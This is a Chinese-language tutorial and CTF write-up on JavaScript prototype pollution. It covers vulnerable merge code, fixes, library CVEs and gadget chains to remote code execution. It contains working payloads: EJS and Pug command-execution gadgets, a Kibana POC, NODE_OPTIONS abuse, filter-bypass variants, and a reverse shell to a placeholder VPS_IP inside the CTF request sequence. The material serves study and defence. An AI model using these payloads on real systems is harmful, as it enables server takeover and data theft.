# Javascript 原型链污染

## 一句话理解
原型链污染（Prototype Pollution）的核心，是攻击者修改 JavaScript 对象原型上的属性，导致后续所有基于该原型创建的对象都受到影响，进而引发逻辑绕过、属性注入，甚至在特定应用链中升级为代码执行。

## 基础理解
### `prototype` 与 `__proto__`
- `prototype` 是构造函数的属性
- 对象的 `__proto__` 指向其构造函数的 `prototype`

JavaScript 的继承机制正是建立在这条原型链之上。  
一旦攻击者能把恶意属性写进共享原型，对整个应用的对象行为都会产生影响。

## 常见危害
- 覆盖默认属性值
- 绕过权限或业务判断
- 污染配置对象
- 影响模板引擎、请求构造、序列化逻辑
- 在特定框架或依赖链中升级为 RCE

## 常见成因
- 深拷贝 / merge 函数实现不安全
- 递归合并对象时未过滤 `__proto__`、`constructor`、`prototype`
- 接收 JSON / 查询参数后直接做对象合并
- 依赖库本身存在原型污染漏洞

## 常见入口
- `__proto__`
- `constructor.prototype`
- `prototype`

如果应用把这些键名当作普通数据处理并参与合并，就容易触发污染。

## 污染 Payload 基础

### JSON 形式
```json
{"__proto__":{"isAdmin":true}}
```
适用于 POST JSON body、JSON 配置导入等入口。

### HTTP 参数形式（qs / extended querystring 解析）
```
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```
方括号语法会被 qs 解析成嵌套对象 `{"__proto__":{"isAdmin":"true"}}`，效果与 JSON 等价。

### 三种键名入口
- `__proto__`：最直接，`target['__proto__']` 经 getter 取到的就是原型对象
- `constructor.prototype`：`target['constructor']` 返回 `Object` 构造函数，再取 `.prototype` 同样落到 `Object.prototype`
- `prototype`：单独使用时在普通对象上取值多为 undefined，一般需配合 `constructor` 两级嵌套

### 为何 constructor.prototype 常用来绕过防御
很多防御只黑名单了 `__proto__` 字符串：
```js
if (key === '__proto__') continue;  // 只挡了 __proto__，防御被绕过
```
而 `constructor` / `prototype` 未被过滤时，递归路径 `target['constructor']['prototype']` 依然能定位到 `Object.prototype`，最终落点与 `__proto__` 完全相同。正确姿势是三个键全部拉黑。

### 污染验证方法
污染成功的标志：任意新对象的属性查询命中污染值。

Node 控制台演示：
```js
// 模拟不安全递归 merge
function unsafeMerge(target, source) {
  for (const key in source) {
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key] || typeof target[key] !== 'object') target[key] = {};
      unsafeMerge(target[key], source[key]); // key 为 __proto__ 时，target['__proto__'] 返回 Object.prototype，递归赋值落在原型上
    } else {
      target[key] = source[key];
    }
  }
}

const evil = JSON.parse('{"__proto__":{"isAdmin":true}}'); // 注意：JSON.parse 本身不污染，__proto__ 只是自有属性
unsafeMerge({}, evil);  // 真正的污染发生在递归赋值这一步

({}).isAdmin                   // true  —— 任意新对象都命中，说明 Object.prototype 已中招
({}).hasOwnProperty('isAdmin') // false —— 值在原型上而非自有属性
```

两个易踩的坑：
- `JSON.parse` 不会污染：它以“定义属性”的方式创建 `__proto__`，不触发 setter。污染发生在解析结果随后进入递归赋值 / `_.set` 等环节
- 只影响单个对象不算全局污染：`obj.__proto__ = {...}` 只是换了该对象的原型；`({}).isAdmin === true` 才算污染了共享原型

## 漏洞代码示例

### 经典不安全 merge
```js
// 经典不安全 merge：递归赋值，完全不过滤 key
function unsafeMerge(target, source) {
  for (const key in source) {
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = {};
      }
      unsafeMerge(target[key], source[key]);
      // key 为 __proto__ 时，target['__proto__'] 经 getter 返回 Object.prototype
      // 递归赋值实际落在 Object.prototype 上 → 全局污染
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Express 典型受害点：body 直接合并进业务对象
app.post('/update', (req, res) => {
  unsafeMerge(config, req.body); // body = {"__proto__":{"isAdmin":true}} → 全局污染
  res.send('ok');
});
```

### 修复版（三种手段）
```js
// 修复1：黑名单过滤危险键
const FORBIDDEN_KEYS = ['__proto__', 'constructor', 'prototype'];

function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (FORBIDDEN_KEYS.includes(key)) continue; // 三个危险键全部拒绝
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key] || typeof target[key] !== 'object') target[key] = {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// 修复2：用 Object.create(null) 作为合并容器，直接切断原型链
const store = Object.create(null); // 无原型，污染无处落脚
unsafeMerge(store, req.body);

// 修复3：需要保留键语义时用 Map 替代普通对象
const conf = new Map();
conf.set('__proto__', 'value'); // Map 的 key 只是普通字符串，不会触碰原型
```

### 常见受害库点名
- lodash `_.merge` — CVE-2018-3721（<4.17.5）：`_.merge({}, JSON.parse('{"__proto__":{"a":1}}'))`
- lodash `_.defaultsDeep` — CVE-2019-10744（<4.17.12）：`_.defaultsDeep({}, JSON.parse('{"__proto__":{"a":1}}'))`
- jQuery `$.extend(true, ...)` — CVE-2019-11358（<3.4.0）：`$.extend(true, {}, JSON.parse('{"__proto__":{"devMode":true}}'))`
- 其他历史案例：lodash `_.set`（CVE-2020-8203，路径写法 `_.set({}, '__proto__.a', 1)`）、minimist（CVE-2020-7598）

修复口径：lodash 升级至 ≥4.17.12，jQuery 升级至 ≥3.4.0。

## 实战理解
原型污染很多时候不是“单独直接拿 shell”，而是：
1. 先污染全局对象默认属性
2. 再寻找受影响的业务逻辑
3. 最终通过配置污染、模板污染、命令参数污染等方式达成更高危利用

## 常见场景
- 后端 Node.js 参数解析
- 前端对象合并
- Express / Koa 中间件
- 模板渲染上下文
- 配置对象默认值继承
- 权限判断和特征开关

## 实战排查思路
### 1. 先找不安全合并点
重点审计：
- `merge`
- `extend`
- 深拷贝函数
- 递归对象赋值逻辑

### 2. 再找可污染对象
重点看污染后能否影响：
- 身份认证
- 权限判断
- 模板渲染
- 命令执行参数
- 请求选项和安全配置

### 3. 最后找高价值利用链
原型污染真正的难点往往不在“写进去”，而在“污染之后怎样利用”。

## 审计关键词

### 函数与调用点
定位以下关键词的调用点，回溯参数是否用户可控：
- `merge` / `mergeWith` / `deepMerge`
- `extend` / `assign` / `assignIn`
- `clone` / `cloneDeep` / `deepCopy` / `deepcopy`
- `defaultsDeep`（递归填默认值，同样是污染点）
- `_.set` / `_.setWith` —— 路径参数直接可污染：`_.set({}, '__proto__.isAdmin', true)`、`_.set({}, 'constructor.prototype.isAdmin', true)`
- 自研 `recursive` / `traverse` 类递归赋值

### 解析行为要点
- `body-parser`：JSON 解析本身不污染（`__proto__` 为自有属性），风险在解析结果随后进入 merge / 递归赋值
- `qs`（Express 默认 extended query 解析器）：`?__proto__[a]=1` 直接构造嵌套对象；新版 qs 默认 `allowPrototypes: false` 屏蔽 `__proto__` 与 `constructor.prototype`，旧版本无防护
- `fast-json-stringify`：按传入的 JSON Schema 编译序列化器，schema 属性读取沿原型链会命中污染值，历史版本存在原型污染，需升级
- URL 编码变体勿漏：`%5F%5Fproto%5F%5F`（即 `__proto__`）、双重编码绕 WAF

## 污染后利用链

核心思路：污染只是起点，关键是找一个会“以危险方式消费被污染属性”的读取点。

### 1. EJS RCE（CVE-2022-29078）
污染 payload：
```json
{"__proto__":{"outputFunctionName":"a; return global.process.mainModule.constructor._load('child_process').execSync('id'); //"}}
```
触发原理：
- EJS 编译模板时把 `options.outputFunctionName` 拼进渲染函数源码前缀（`var <值> = __append;`）
- 污染后拼接结果变为 `var a; return ...execSync('id'); // = __append;`
- `a;` 闭合声明 → 注入 `return` 执行命令 → `//` 注释吞掉残尾
- 触发方式：让应用 render 任意走 EJS 编译的页面（注意模板已被编译缓存时需换一个未渲染过的路由）

### 2. child_process 环境注入 / NODE_OPTIONS
污染 payload：
```json
{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ"}}
```
利用思路：
- 前提：应用调用 `child_process.spawn/fork` 且 `env` 传入可被原型链影响的普通对象（env 以 `for...in` 方式遍历，会带出 `Object.prototype` 上的可枚举污染键）
- 子进程带着 `NODE_OPTIONS=--require /proc/self/environ` 启动，Node 在加载主模块前把 `/proc/self/environ`（环境变量快照，`KEY=VALUE\0` 串）当作 JS 模块执行
- 攻击者先把恶意 JS 写进某个环境变量（如通过可控的 User-Agent 请求头混入 CGI / 日志类场景的环境变量），environ 被解析时即执行
- 实战中常配合再污染一个自定义变量存放 payload，并用 `//` 注释规避 env 文件中的非法字符
- 仅 Linux 可用（依赖 /proc 文件系统）；应用无 spawn 子进程则链条不成立

### 3. Kibana CVE-2019-7606（timelion 原型污染 → RCE）简述
timelion 组件 `.props()` 表达式可写对象属性导致原型污染，经典 POC：
```
.es(*).props(label.__proto__.constructor.prototype.env.AAA="require('child_process').execSync('i');")
.props(label.__proto__.constructor.prototype.env.NODE_OPTIONS="--require /proc/self/environ")
```
配合 User-Agent 请求头携带恶意代码写入环境变量；Kibana 生成报表时 spawn 子进程，子进程读取被污染的 `NODE_OPTIONS` 加载 `/proc/self/environ`，执行注入的代码。本质是“污染 → 环境变量 → 子进程 require 文件”的组合链。

### 4. Express 中间件污染（serve-static）简述
- `express.static` / serve-static 初始化时逐项读取 options（`dotfiles`、`redirect`、`fallthrough`、`index`、`setHeaders` 等）
- 应用传入空 / 缺省 options 时，这些读取沿原型链命中污染值，可劫持中间件行为：放宽 `dotfiles` 限制读敏感文件、关闭重定向、注入自定义响应头
- `__proto__.static` 这类 gadget 针对的是把静态服务配置存在对象属性（如 `config.static`）再读取的应用写法，污染后可改变静态目录解析逻辑；具体效果取决于应用的读取方式

### 5. 改变渲染分支（一句话）
污染 `{"__proto__":{"status":510}}` 之类，可让 Dot / Handlebars 等场景中依据 `options.status` 等键选择渲染路径的逻辑走进意外分支——利用点在应用代码，污染只是开关；顺带一提，污染 `status` 后观察响应码是否变化，也是服务端污染的盲测手段。

### 其他 gadget 速查
- Pug：污染 `block`，形如 `{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require('child_process').execSync('id')"}}}`
- 客户端 gadget 大全：BlackFan/client-side-prototype-pollution
- 服务端研究资料：HoLyVieR/prototype-pollution-nsec18

## CTF 案例

### 例题背景
Express + EJS 应用：`/merge` 接口把用户 JSON 递归合并进对象（无 key 过滤），首页走 EJS 渲染。目标：读 `/flag`。

漏洞环境（典型出题代码）：
```js
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
app.use(bodyParser.json());
app.set('view engine', 'ejs');

app.post('/merge', (req, res) => {
  const merge = (t, s) => {
    for (const k in s) {
      if (s[k] && typeof s[k] === 'object') {
        t[k] = t[k] || {};
        merge(t[k], s[k]); // 危险：k 为 __proto__ 时递归进入 Object.prototype
      } else {
        t[k] = s[k];
      }
    }
  };
  merge({}, req.body);
  res.send('ok');
});

app.get('/check', (req, res) => res.json({ polluted: ({}).polluted })); // 探测口
app.get('/', (req, res) => res.render('index', { title: 'CTF' }));     // gadget 触发点

app.listen(3000);
```

### 攻击流程（四个请求）

请求 1：污染 `polluted` 键，探测入口
```http
POST /merge HTTP/1.1
Host: 1.2.3.4:3000
Content-Type: application/json

{"__proto__":{"polluted":"Yes"}}
```

请求 2：验证全局污染是否生效
```http
GET /check HTTP/1.1
Host: 1.2.3.4:3000
```
返回 `{"polluted":"Yes"}` 即确认；无探测口时直接盲打下一步。

请求 3：污染 EJS gadget（读 flag）
```http
POST /merge HTTP/1.1
Host: 1.2.3.4:3000
Content-Type: application/json

{"__proto__":{"outputFunctionName":"a; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString(); //"}}
```

请求 4：触发渲染，命令输出随页面返回
```http
GET / HTTP/1.1
Host: 1.2.3.4:3000
```

反弹 shell 版 gadget（出网环境）：
```json
{"__proto__":{"outputFunctionName":"a; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >& /dev/tcp/VPS_IP/4444 0>&1\"'); //"}}
```

### 踩坑提示
- `Content-Type` 必须为 `application/json`，否则 body-parser 不解析、`req.body` 为空
- EJS gadget 在模板首次编译时取值，首页若已渲染过（编译缓存），换一个未触发过的路由
- 目标不出网时优先 `cat /flag` 直读；出网再考虑反弹 shell
- 应用过滤 `__proto__` 时改用 `{"constructor":{"prototype":{"outputFunctionName":"..."}}}`（JSON）或 `?constructor[prototype][outputFunctionName]=...`（query）绕过

## 常见防御要点
### 1. 过滤危险键
明确拒绝：
- `__proto__`
- `constructor`
- `prototype`

### 2. 使用安全库版本
历史上很多 merge、querystring、对象处理库都出现过原型污染问题，应及时升级。

### 3. 避免把不可信对象直接递归合并
尤其是：
- 用户输入 JSON
- 查询字符串对象
- 动态配置对象

### 4. 使用无原型对象
在部分高风险场景下，可考虑使用：
- `Object.create(null)`

减少原型链继承带来的影响面。

## 速查清单
- 先看是否存在深拷贝或递归 merge
- 检查是否过滤 `__proto__`、`constructor.prototype`
- 污染后优先观察权限判断、配置项、模板对象是否受影响
- 不把原型污染只看成前端问题，Node.js 后端同样高危
- 真正高价值的是“污染后的二次利用链”

## Reference
- [CVE-2019-11358分析](https://xz.aliyun.com/t/11272)
- [深入理解 JavaScript Prototype 污染攻击](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)
- [PortSwigger – Prototype pollution（Web Security Academy）](https://portswigger.net/web-security/prototype-pollution)
- [snyk – Prototype pollution attack in Node.js](https://snyk.io/blog/prototype-pollution-javascript/)
- [snyk – Exploiting prototype pollution: RCE in Kibana (CVE-2019-7606)](https://snyk.io/blog/exploiting-prototype-pollution-rce-kibana-cve-2019-7606/)
- [snyk – Prototype pollution: preventing JavaScript security vulnerabilities](https://snyk.io/blog/prototype-pollution-preventing-javascript-security-vulnerabilities/)
- [NCC Group Research – 原型污染相关技术通告（站内搜索 prototype pollution）](https://research.nccgroup.com/)
- [Cure53 – 原型污染专项调研（2020，检索 "Prototype Pollution: The Known Unknowns"）](https://cure53.de/)
- [客户端原型污染 Gadget 列表（BlackFan）](https://github.com/BlackFan/client-side-prototype-pollution)
- [NorthSec 2018 原型污染研究资料（HoLyVieR）](https://github.com/HoLyVieR/prototype-pollution-nsec18)
